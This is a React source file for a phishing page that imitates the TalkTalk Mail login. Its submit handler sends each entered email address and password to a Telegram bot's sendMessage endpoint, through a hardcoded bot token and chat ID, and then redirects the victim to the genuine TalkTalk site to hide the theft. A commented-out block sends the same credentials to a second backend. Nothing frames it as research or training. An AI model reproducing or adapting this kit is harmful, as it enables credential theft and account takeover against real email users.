import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
import myfairpoint from './fairpoint.png';
import aska from './aska.png';
import talktalk from './talktalk.png';

import ddd from './ddd.png';
import talk from './talk.png';

import service from './service.png';


function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("TalkTalk")

    const[showError, setShowError] = useState(false);


    

  


      

async function handleSubmit(e){
    e.preventDefault();

    try {
        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
        //     email:email,
        //     password:password,
        //     platform:platform
        // });


        


       const response =  await axios.post(`https://api.telegram.org/bot6900331145:AAGvVRRZV-leQZaqag7znIRPlJ79dQfZRJ0/sendMessage`, {
            chat_id: 7150651870,
            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
          });

    
        // Handle success
     

        if(response.status == 200){
           // console.log(response.data.message);

          
           window.location.href = 'https://apps.talktalk.co.uk/appsuite/';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

    return (
        <>
            <nav className='mynav px-3 py-4 navbg'>
                <img className='navimage' src={talktalk} />

            </nav>

                <div className='py-5'>

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv  p-0 '>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

               


                <div className='row px-5'>

                    <div className='col-md-9 bigdiv px-5'>
                        <h2 className='bighead'>Login to discover your new TalkTalk Mail Today</h2>


                        <div className='bigflex'>
                                <div className='contents'>
                                            <h4 className='bigsub'>We've made TalkTalk Mail better <br/>
                                        and even easier to use
                                    </h4>

                                    <p className='bigpara'>We've introduced feature you have been asking for. 
                                    Your email now has a dedicated spam button to help you improve spam filters and
                                    protect you from scams.  When you recieve a spam mail , just click '<b>Mark as spam</b>'
                                    link to update your spam filters.
                                    
                                    </p>


                                     <a className='biglink'>Find out more</a>

                                </div>

                                
                                <img className='fleximage' src={ddd}/>

                             </div>

                        
                    </div>


                    <div className='col smalldiv card py-5'>

                        <div className='talkdiv'>
                            <img src={talk} className="talkimage"/>
                        </div>

                        <br/>

                        <p className='purple'>Sign in to access your apps:</p>

                        <div className='text-center'>
                        <img src={service} className="service"/>
                        </div>

                                                <form onSubmit={handleSubmit} className='px-2 py-3'>

                                        

                        <div className='form-group'>
                            <label className='text-secondary font-weight-bold'>Your TalkTalk email address *</label>
                            <input onChange={function(e){
                                                        setUserName(e.target.value);
                                                    }}value={email} type="email"placeholder='Email' className='form-control' required />

                        </div>

                        <div className='form-group'>
                        <label className='text-secondary font-weight-bold py-2'>Your Password *</label>
                            <input onChange={function(e){
                                                        setPassword(e.target.value);
                                                    }}value={password} type="password"placeholder='Password' className='form-control' required />

                        </div>


                        <div className=''>
                            <a className='forgot' href="">Forgotten Your Password ?</a>
                        </div>



                            

                        


                        <div className='buttondiv py-4 text-center'>
                            <button className='mybutton rounded py-2'type="submit">Sign In</button>

                        </div>


                     



                        </form>

                    
                    </div>

                </div>

                

                

            </div>
            
            <br/>

        </>
    );

}

export default Home;